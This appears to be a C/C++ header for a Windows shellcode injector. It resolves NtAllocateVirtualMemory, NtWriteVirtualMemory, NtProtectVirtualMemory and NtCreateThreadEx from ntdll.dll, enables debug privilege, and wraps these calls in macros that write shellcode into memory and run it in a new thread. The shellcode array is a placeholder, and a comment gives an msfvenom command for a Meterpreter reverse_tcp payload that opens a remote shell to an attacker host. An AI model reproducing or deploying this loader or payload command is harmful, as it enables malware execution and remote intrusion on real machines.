#pragma once
#include <windows.h>
#include <stdio.h>
#include <iostream> 

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

typedef NTSTATUS(NTAPI* PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* PFN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
    );

typedef NTSTATUS(NTAPI* PFN_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BufferSize,
    PSIZE_T NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* PFN_NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef NTSTATUS(NTAPI* PFN_NtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
    );

typedef NTSTATUS(NTAPI* PFN_NtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* PFN_NtClose)(
    HANDLE Handle
    );

PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory;
PFN_NtProtectVirtualMemory NtProtectVirtualMemory;
PFN_NtWriteVirtualMemory NtWriteVirtualMemory;
PFN_NtCreateThreadEx NtCreateThreadEx;
PFN_NtWaitForSingleObject NtWaitForSingleObject;
PFN_NtFreeVirtualMemory NtFreeVirtualMemory;
PFN_NtClose NtClose;

HANDLE processHandle;
PVOID baseAddress;
SIZE_T regionSize;
ULONG allocationType;
ULONG protect;
ULONG oldProtect;
NTSTATUS status;
HANDLE threadHandle;
SIZE_T bytesWritten;

unsigned char shellcode[] = {
    // define your shellcode
    // msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f csharp -b "\x00\x0a\x0d" EXITFUNC=thread 
    // or create you personall shellcode    

    0x90, 0x90, 0xC3 
};


#define Sq_AllocateMemory(processHandle, baseAddress, regionSize, allocationType, protect) \
    do { \
        status = NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize, allocationType, protect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtAllocateVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize) \
    do { \
        status = NtWriteVirtualMemory(processHandle, baseAddress, buffer, bufferSize, &bytesWritten); \
        if (status != STATUS_SUCCESS || bytesWritten != bufferSize) { \
            printf("NtWriteVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_ProtectVirtualMemory(processHandle, baseAddress, regionSize, protect) \
    do { \
        status = NtProtectVirtualMemory(processHandle, &baseAddress, &regionSize, protect, &oldProtect); \
        if (status != STATUS_SUCCESS) { \
            printf("NtProtectVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_CreateThreadEx(threadHandle, processHandle, baseAddress) \
    do { \
        status = NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, baseAddress, NULL, FALSE, 0, 0, 0, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtCreateThreadEx failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_WaitForSingleObject(threadHandle) \
    do { \
        status = NtWaitForSingleObject(threadHandle, FALSE, NULL); \
        if (status != STATUS_SUCCESS) { \
            printf("NtWaitForSingleObject failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_Close(handle) \
    do { \
        status = NtClose(handle); \
        if (status != STATUS_SUCCESS) { \
            printf("NtClose failed: %lx\n", status); \
            return 1; \
        } \
    } while(0)

#define Sq_FreeVirtualMemory(processHandle, baseAddress, regionSize) \
    do { \
        status = NtFreeVirtualMemory(processHandle, &baseAddress, &regionSize, MEM_RELEASE); \
        if (status != STATUS_SUCCESS) { \
            printf("NtFreeVirtualMemory failed: %lx\n", status); \
            return 1; \
        } \
        baseAddress = NULL; \
    } while(0)

BOOL InitNtFunctions() {
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    if (!hNtDll) {
        printf("Failed to get handle to ntdll.dll\n");
        return FALSE;
    }

    NtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
    NtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtDll, "NtProtectVirtualMemory");
    NtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
    NtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtDll, "NtCreateThreadEx");
    NtWaitForSingleObject = (PFN_NtWaitForSingleObject)GetProcAddress(hNtDll, "NtWaitForSingleObject");
    NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(hNtDll, "NtFreeVirtualMemory");
    NtClose = (PFN_NtClose)GetProcAddress(hNtDll, "NtClose");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtWriteVirtualMemory ||
        !NtCreateThreadEx || !NtWaitForSingleObject || !NtFreeVirtualMemory || !NtClose) {
        printf("Failed to get address of NT functions\n");
        return FALSE;
    }

    return TRUE;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tokenPrivileges;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return false;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luid;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

void PrintSlashAnimation() {
    const int animationDelay = 200;
    const int animationDuration = 2000; 
    const char slash = '/';

    int startTime = GetTickCount64();
    while (GetTickCount64() - startTime < animationDuration) {
        putchar(slash);
        fflush(stdout);
        Sleep(animationDelay);
        putchar('\b'); 
        fflush(stdout);
        Sleep(animationDelay);
    }
}
void effect() {
    for (int i = 0; i < 10; ++i) {
        printf("\r  [");
        if (i % 2 == 0) {
            printf("\\");
        }
        else {
            printf("/");
        }
        printf("]");
        Sleep(100);
    }
}
void Debug() {
    printf("      Enableaing Debug privilege");
    effect();
    printf("[*] Debug privilege enabled \n");
}
void Ntdl() {
    printf("      Loading ntdll.dll");
    effect();
    printf("[*] Loaded ntdll.dll functions \n");
}
void NtVirt() {
    printf("      Loading function: NtAllocateVirtualMemory");
    effect();
    printf("[*] Loaded function: NtAllocateVirtualMemory\n");
}
void NtWrite() {
    printf("      Loading function: NtWriteVirtualMemory");
    effect();
    printf("[*] Loaded function: NtWriteVirtualMemory\n");
}
void NtProtect() {
    printf("      Loading function: NtProtectVirtualMemory");
    effect();
    printf("[*] Loaded function: NtProtectVirtualMemory\n");
}
void PageMemR() {
    printf("      Set Memory protection to PAGE_EXECUTE_READWRITE ");
    effect();
    printf("[*] Memory protection set to PAGE_EXECUTE_READWRITE\n");
}
void NtThread() {
    printf("      Loading function: NtCreateThreadEx");
    effect();
    printf("[*] Loaded function: NtCreateThreadEx\n");
}

void ThdxSc() {
    printf("      Creating Thread to execute shellcode");
    effect();
    printf("[+] Thread created to execute shellcode\n");
}
void NtObjcect() {
    printf("      Loading function: NtWaitForSingleObject ");
    effect();
    printf("[*] Loaded function: NtWaitForSingleObject\n");
}
void NtFreeMemory() {
    printf("      Loading function: NtFreeVirtualMemory");
    effect();
    printf("[*] Loaded function: NtFreeVirtualMemory\n");
}
void FredMem() {
    printf("      Freeing your memory");
    effect();
    printf("[+] Memory freed    \n");
}
void Ntcose() {
    printf("      Loading function: NtClose");
    effect();
    printf("[*] Loaded function: NtClose\n");
}
